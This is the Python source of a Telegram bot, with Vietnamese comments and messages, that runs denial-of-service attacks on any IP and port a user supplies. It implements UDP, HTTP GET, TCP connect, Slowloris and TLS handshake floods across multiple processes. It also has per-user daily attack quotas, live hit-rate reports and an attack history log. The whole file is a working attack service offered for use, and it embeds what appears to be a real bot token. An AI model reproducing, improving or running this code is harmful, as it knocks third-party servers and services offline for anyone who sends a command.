#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SHADY BOT ULTIMATE - Bot tấn công đa chức năng
- Chỉ 1 attack duy nhất (admin hay user)
- Nút Stop (inline keyboard) chỉ dành cho admin
- /stop dừng attack hiện tại
- Báo cáo realtime có số lượt thành công & thất bại (đã sửa đếm chính xác)
- TCP worker non‑blocking tốc độ cao
"""

import sys
import os
import time
import json
import random
import socket
import ssl
import threading
import multiprocessing
from datetime import datetime, date
from telebot import types

# ------------------- CÀI ĐẶT THƯ VIỆN -------------------
try:
    import telebot
except ImportError:
    os.system("pip install pyTelegramBotAPI")
    import telebot

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    os.system("pip install psutil")
    try:
        import psutil
        HAS_PSUTIL = True
    except:
        HAS_PSUTIL = False

# ------------------- CẤU HÌNH -------------------
TOKEN = "8888447876:AAEn2a-IFQngELwwX9vhxMJFy-hDfWqVK5Y"   # THAY TOKEN CỦA BẠN
ADMIN_IDS = [8994960871]                                   # THAY ID ADMIN
BOT_NAME = "Shady Bot Ultimate"

bot = telebot.TeleBot(TOKEN, threaded=True, num_threads=30)

# ------------------- TỰ ĐỘNG TINH CHỈNH CPU & LUỒNG -------------------
IS_WINDOWS = sys.platform == 'win32'

def get_pids_limit():
    if IS_WINDOWS: return 65536
    try:
        with open("/sys/fs/cgroup/pids/pids.max", "r") as f:
            val = f.read().strip()
            return int(val) if val != "max" else 4096
    except: return 4096

def get_current_pids():
    if IS_WINDOWS: return 0
    try:
        with open("/sys/fs/cgroup/pids/pids.current", "r") as f:
            return int(f.read().strip())
    except: return 0

def get_optimal_config():
    if HAS_PSUTIL:
        ram_mb = psutil.virtual_memory().available // (1024 * 1024)
    else:
        ram_mb = 1024
    pids_limit = get_pids_limit()
    current = get_current_pids()
    max_threads_by_pids = max(100, pids_limit - current - 50)
    max_threads_by_ram = max(100, ram_mb // 8)
    max_threads = min(max_threads_by_ram, max_threads_by_pids, 4000)
    max_threads = max(max_threads, 200)
    cpu = multiprocessing.cpu_count()
    max_proc = min(cpu, 6)
    thr_per_proc = max_threads // max_proc
    if thr_per_proc < 20:
        thr_per_proc = 20
        max_proc = max_threads // 20
    thr_per_proc = min(thr_per_proc, 250)
    return max_proc, thr_per_proc

CPU_COUNT, THREADS_PER_PROC = get_optimal_config()
print(f"[CẤU HÌNH] {CPU_COUNT} tiến trình × {THREADS_PER_PROC} luồng = {CPU_COUNT * THREADS_PER_PROC} tổng")

# ------------------- QUẢN LÝ DỮ LIỆU -------------------
STATS_FILE = "stats.json"
HISTORY_FILE = "history.txt"
USAGE_FILE = "user_usage.json"

def load_user_usage():
    if not os.path.exists(USAGE_FILE):
        return {}
    with open(USAGE_FILE, "r") as f:
        try:
            return json.load(f)
        except:
            return {}

def save_user_usage(usage):
    with open(USAGE_FILE, "w") as f:
        json.dump(usage, f, indent=2)

def check_user_limit(user_id, requested_duration):
    if user_id in ADMIN_IDS:
        return True, requested_duration, None
    usage = load_user_usage()
    today = str(date.today())
    user_data = usage.get(str(user_id), {})
    if user_data.get("date") != today:
        user_data = {"date": today, "total_used": 0}
    total_used = user_data.get("total_used", 0)
    max_per_day = 3000
    if total_used >= max_per_day:
        return False, 0, f"❌ Bạn đã dùng hết {max_per_day}s hôm nay. Hãy chờ đến ngày mai."
    allowed_duration = min(requested_duration, 300)
    msg = None
    if requested_duration > 300:
        msg = f"⚠️ Mỗi lần tối đa 300s. Đã giảm xuống 300s."
    remaining = max_per_day - total_used
    if allowed_duration > remaining:
        allowed_duration = remaining
        msg = f"⚠️ Hôm nay chỉ còn {remaining}s. Đã giảm xuống {remaining}s."
    return True, allowed_duration, msg

def update_user_usage(user_id, used_duration):
    if user_id in ADMIN_IDS:
        return
    usage = load_user_usage()
    today = str(date.today())
    user_data = usage.get(str(user_id), {})
    if user_data.get("date") != today:
        user_data = {"date": today, "total_used": 0}
    user_data["total_used"] = user_data.get("total_used", 0) + used_duration
    usage[str(user_id)] = user_data
    save_user_usage(usage)

def load_stats():
    if not os.path.exists(STATS_FILE):
        return {"total_attacks": 0, "total_hits": 0}
    with open(STATS_FILE, "r") as f:
        try: return json.load(f)
        except: return {"total_attacks": 0, "total_hits": 0}

def save_stats(stats):
    with open(STATS_FILE, "w") as f:
        json.dump(stats, f)

def update_attack_stats(hits):
    stats = load_stats()
    stats["total_attacks"] += 1
    stats["total_hits"] += hits
    save_stats(stats)

def log_attack(user_id, user_name, target, port, duration, mode):
    with open(HISTORY_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now()}] {user_name}({user_id}) → {target}:{port} | {mode} | {duration}s\n")

# ------------------- CÁC WORKER (ĐÃ SỬA TCP WORKER MẠNH + ĐẾM ĐÚNG) -------------------
def udp_worker(ip, port, stop_event, succ_counter, fail_counter):
    payload = os.urandom(65507)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
        while not stop_event.is_set():
            try:
                s.sendto(payload, (ip, port))
                with succ_counter.get_lock(): succ_counter.value += 1
            except:
                with fail_counter.get_lock(): fail_counter.value += 1
        s.close()
    except:
        pass

def http_worker(ip, port, stop_event, succ_counter, fail_counter):
    headers = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".encode()
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            s.send(headers)
            s.close()
            with succ_counter.get_lock(): succ_counter.value += 1
        except:
            with fail_counter.get_lock(): fail_counter.value += 1

def tcp_worker(ip, port, stop_event, succ_counter, fail_counter):
    """TCP connect flood non‑blocking – gói SYN được gửi = success."""
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            err = s.connect_ex((ip, port))
            # EINPROGRESS (115) hoặc EALREADY (114) nghĩa là SYN đã được gửi
            if err in (0, 115, 114):
                with succ_counter.get_lock(): succ_counter.value += 1
            else:
                with fail_counter.get_lock(): fail_counter.value += 1
            s.close()
        except:
            with fail_counter.get_lock(): fail_counter.value += 1

def slowloris_worker(ip, port, stop_event, succ_counter, fail_counter):
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n")
            with succ_counter.get_lock(): succ_counter.value += 1
            while not stop_event.is_set():
                s.send(b"X-Fake: 1.2.3.4\r\n")
                time.sleep(5)
            s.close()
        except:
            with fail_counter.get_lock(): fail_counter.value += 1

def tls_worker(ip, port, stop_event, succ_counter, fail_counter):
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            ctx = ssl.create_default_context()
            ssl_sock = ctx.wrap_socket(s, server_hostname=ip)
            ssl_sock.send(b"GET / HTTP/1.1\r\n\r\n")
            ssl_sock.close()
            with succ_counter.get_lock(): succ_counter.value += 1
        except:
            with fail_counter.get_lock(): fail_counter.value += 1

def get_worker(mode):
    m = mode.upper()
    if m == "L4_UDP": return udp_worker
    elif m == "L7_HTTP": return http_worker
    elif m == "L7_SLOWLORIS": return slowloris_worker
    elif m == "L7_TLS": return tls_worker
    else: return tcp_worker

# ------------------- BIẾN TOÀN CỤC -------------------
current_attack = None
attack_lock = threading.Lock()

# ------------------- BÁO CÁO REAL-TIME VỚI SUCCESS/FAIL -------------------
def monitor_report(chat_id, msg_id, ip, port, mode, duration, attack_id, stop_event, succ_counter, fail_counter):
    start_time = time.time()
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 Dừng tấn công", callback_data="stop_attack"))
    while not stop_event.is_set():
        elapsed = time.time() - start_time
        if duration > 0 and elapsed >= duration:
            stop_event.set()
            break
        time.sleep(2)
        cur_succ = succ_counter.value
        cur_fail = fail_counter.value
        total = cur_succ + cur_fail
        rate = total / elapsed if elapsed > 0 else 0
        percent = min(100, (elapsed / duration) * 100) if duration > 0 else 0
        bar_length = 20
        filled = int(bar_length * percent / 100)
        bar = '█' * filled + '░' * (bar_length - filled)
        text = (
            f"⚔️ *ID tấn công:* `{attack_id}`\n"
            f"🎯 *Mục tiêu:* `{ip}:{port}`\n"
            f"🔧 *Chế độ:* `{mode}`\n"
            f"⏱️ *Thời gian:* `{int(elapsed)}s / {duration}s`\n"
            f"📊 *Tiến độ:* `{percent:.1f}%`\n"
            f"`[{bar}]`\n"
            f"✅ *Thành công:* `{cur_succ:,}`\n"
            f"❌ *Thất bại:* `{cur_fail:,}`\n"
            f"⚡ *Tốc độ:* `{rate:.0f} hits/s`"
        )
        try:
            bot.edit_message_text(text, chat_id, msg_id, parse_mode='Markdown', reply_markup=markup)
        except:
            pass
    final_succ = succ_counter.value
    final_fail = fail_counter.value
    final_total = final_succ + final_fail
    update_attack_stats(final_total)
    try:
        bot.edit_message_reply_markup(chat_id, msg_id, reply_markup=None)
    except:
        pass
    bot.send_message(chat_id, f"🛑 *Kết thúc tấn công #{attack_id}* | ✅ `{final_succ:,}` ❌ `{final_fail:,}` | Tổng: `{final_total:,}`", parse_mode='Markdown')
    global current_attack
    with attack_lock:
        if current_attack and current_attack.get('msg_id') == msg_id:
            current_attack = None

# ------------------- LỆNH TELEGRAM -------------------
@bot.message_handler(commands=['start', 'help'])
def send_help(msg):
    help_text = """🔥 *SHADY BOT ULTIMATE* 🔥

💀 *imminent death* 💀
📌 *Các lệnh:*
🚀 `/attack` `IP:PORT` `thời_gian` `[CHẾ_ĐỘ]`  
   Bắt đầu tấn công (user thường tối đa 300s, 3000s/ngày)
🛑 `/stop`  
   Dừng NGAY cuộc tấn công đang chạy (chỉ admin)
🖥️ `/vps`  
   Kiểm tra hiệu năng VPS
📊 `/stats`  
   Thống kê tổng số vụ tấn công và số hits
🆔 `/id`  
   Xem ID Telegram của bạn
📜 `/lichsu`  
   Lịch sử các cuộc tấn công gần đây
🎯 *Các chế độ tấn công:*  
`MIXED_TCP` (mặc định) · `L4_UDP` · `L7_HTTP` · `L7_SLOWLORIS` · `L7_TLS`
⚡ *Báo cáo trực tiếp cập nhật mỗi 2 giây (có thành công/thất bại)*
🔒 *Chỉ 1 tấn công tại một thời điểm*
🛑 *Nút Stop xuất hiện dưới tin nhắn báo cáo (chỉ admin)*"""
    bot.reply_to(msg, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['attack', 'l4l7'])
def handle_attack(msg):
    global current_attack
    user_id = msg.from_user.id
    with attack_lock:
        if current_attack is not None:
            bot.reply_to(msg, "❌ *Hiện đã có một cuộc tấn công đang chạy!* Hãy dùng `/stop` để dừng (admin) hoặc chờ kết thúc.", parse_mode='Markdown')
            return
    parts = msg.text.split()
    if len(parts) < 2:
        bot.reply_to(msg, "❌ *Cách dùng:* `/attack IP:PORT thời_gian [CHẾ_ĐỘ]`\nVí dụ: `/attack 1.2.3.4:80 60 MIXED_TCP`", parse_mode='Markdown')
        return
    ip_port = parts[1]
    if ':' not in ip_port:
        bot.reply_to(msg, "❌ *Sai định dạng* – Phải là IP:PORT (ví dụ 1.2.3.4:80)", parse_mode='Markdown')
        return
    ip, port_str = ip_port.split(':')
    try:
        port = int(port_str)
    except:
        bot.reply_to(msg, "❌ *Cổng (port) phải là số*", parse_mode='Markdown')
        return
    requested_duration = int(parts[2]) if len(parts) > 2 else 60
    mode = parts[3].upper() if len(parts) > 3 else "MIXED_TCP"

    allowed, final_duration, limit_msg = check_user_limit(user_id, requested_duration)
    if not allowed:
        bot.reply_to(msg, limit_msg, parse_mode='Markdown')
        return
    if limit_msg:
        bot.reply_to(msg, limit_msg, parse_mode='Markdown')
    if final_duration <= 0:
        bot.reply_to(msg, "❌ Thời gian tấn công không hợp lệ.", parse_mode='Markdown')
        return

    with attack_lock:
        if current_attack is not None:
            bot.reply_to(msg, "❌ *Đã có tấn công khác đang chạy!*", parse_mode='Markdown')
            return
        attack_id = int(time.time())
        succ_counter = multiprocessing.Value('q', 0)
        fail_counter = multiprocessing.Value('q', 0)
        stop_event = multiprocessing.Event()
        procs = []
        worker = get_worker(mode)
        for _ in range(CPU_COUNT):
            p = multiprocessing.Process(target=worker, args=(ip, port, stop_event, succ_counter, fail_counter))
            p.daemon = True
            p.start()
            procs.append(p)
        current_attack = {
            'id': attack_id,
            'procs': procs,
            'stop_event': stop_event,
            'target': f"{ip}:{port}",
            'user_id': user_id,
            'duration': final_duration,
            'chat_id': msg.chat.id
        }

    update_user_usage(user_id, final_duration)
    init_msg = bot.reply_to(msg, f"⚔️ *Đã phóng tấn công #{attack_id}* 🎯\n🎯 *Mục tiêu:* `{ip}:{port}`\n🔧 *Chế độ:* `{mode}`\n⏱️ *Thời lượng:* `{final_duration}s`\n_Đang cập nhật mỗi 2 giây..._", parse_mode='Markdown')
    with attack_lock:
        if current_attack:
            current_attack['msg_id'] = init_msg.message_id
    monitor_thread = threading.Thread(
        target=monitor_report,
        args=(msg.chat.id, init_msg.message_id, ip, port, mode, final_duration, attack_id, stop_event, succ_counter, fail_counter),
        daemon=True
    )
    monitor_thread.start()

@bot.message_handler(commands=['stop'])
def handle_stop(msg):
    global current_attack
    user_id = msg.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(msg, "🚫 *Chỉ admin mới có quyền dừng tấn công!*", parse_mode='Markdown')
        return
    with attack_lock:
        if current_attack is None:
            bot.reply_to(msg, "ℹ️ *Hiện không có cuộc tấn công nào đang chạy*", parse_mode='Markdown')
            return
        current_attack['stop_event'].set()
        for p in current_attack.get('procs', []):
            try: p.terminate()
            except: pass
        current_attack = None
    bot.reply_to(msg, "🛑 *Đã dừng cuộc tấn công* ✅", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == "stop_attack")
def callback_stop(call):
    user_id = call.from_user.id
    if user_id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Bạn không có quyền dừng tấn công!", show_alert=True)
        return
    global current_attack
    with attack_lock:
        if current_attack is None:
            bot.answer_callback_query(call.id, "ℹ️ Không có tấn công nào đang chạy.", show_alert=True)
            return
        current_attack['stop_event'].set()
        for p in current_attack.get('procs', []):
            try: p.terminate()
            except: pass
        try:
            bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
        except:
            pass
        current_attack = None
    bot.answer_callback_query(call.id, "✅ Đã dừng tấn công!", show_alert=False)
    bot.send_message(call.message.chat.id, "🛑 *Đã dừng cuộc tấn công* ✅", parse_mode='Markdown')

@bot.message_handler(commands=['vps'])
def vps_status(msg):
    if msg.from_user.id not in ADMIN_IDS:
        bot.reply_to(msg, "🚫 *Truy cập bị từ chối*", parse_mode='Markdown')
        return
    if not HAS_PSUTIL:
        bot.reply_to(msg, "⚠️ *psutil chưa được cài* – Cài bằng lệnh: `pip install psutil`", parse_mode='Markdown')
        return
    cpu = psutil.cpu_percent(interval=1)
    mem = psutil.virtual_memory()
    uptime_sec = time.time() - psutil.boot_time()
    uptime = f"{int(uptime_sec//3600)}h {int((uptime_sec%3600)//60)}m {int(uptime_sec%60)}s"
    text = f"""🖥️ *TRẠNG THÁI VPS*

💻 *CPU:* `{cpu}%`
🧠 *RAM:* `{mem.used//(1024**2)}MB / {mem.total//(1024**2)}MB` ({mem.percent}%)
⏱️ *Thời gian hoạt động:* `{uptime}`
🔧 *Cấu hình:* `{CPU_COUNT} tiến trình × {THREADS_PER_PROC} luồng`"""
    bot.reply_to(msg, text, parse_mode='Markdown')

@bot.message_handler(commands=['stats'])
def stats_cmd(msg):
    if msg.from_user.id not in ADMIN_IDS:
        return
    s = load_stats()
    bot.reply_to(msg, f"📊 *THỐNG KÊ*\n✨ *Tổng số vụ tấn công:* `{s['total_attacks']}`\n✅ *Tổng số lượt truy cập (hits):* `{s['total_hits']:,}`", parse_mode='Markdown')

@bot.message_handler(commands=['id'])
def id_cmd(msg):
    bot.reply_to(msg, f"🆔 *ID của bạn:* `{msg.from_user.id}`", parse_mode='Markdown')

@bot.message_handler(commands=['lichsu'])
def history_cmd(msg):
    if msg.from_user.id not in ADMIN_IDS:
        return
    if not os.path.exists(HISTORY_FILE):
        bot.reply_to(msg, "📭 *Chưa có lịch sử tấn công*", parse_mode='Markdown')
        return
    with open(HISTORY_FILE, 'r') as f:
        lines = f.readlines()[-15:]
        text = "📜 *15 LẦN TẤN CÔNG GẦN NHẤT*\n" + ''.join(lines)
        bot.reply_to(msg, text, parse_mode='Markdown')

# ------------------- MAIN -------------------
if __name__ == "__main__":
    print(f"--- {BOT_NAME} SẴN SÀNG | ADMIN: {ADMIN_IDS[0]} ---")
    print(f"--- CẤU HÌNH: {CPU_COUNT} processes × {THREADS_PER_PROC} threads ---")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=60)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(10)